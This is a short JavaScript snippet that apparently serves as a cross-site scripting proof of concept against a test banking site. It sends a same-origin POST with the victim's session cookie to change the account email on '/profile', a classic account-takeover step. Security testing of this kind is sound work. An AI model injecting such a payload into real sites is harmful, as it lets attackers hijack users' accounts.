fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=alice-xss-test%40devbank.local",
  credentials: "same-origin"
});
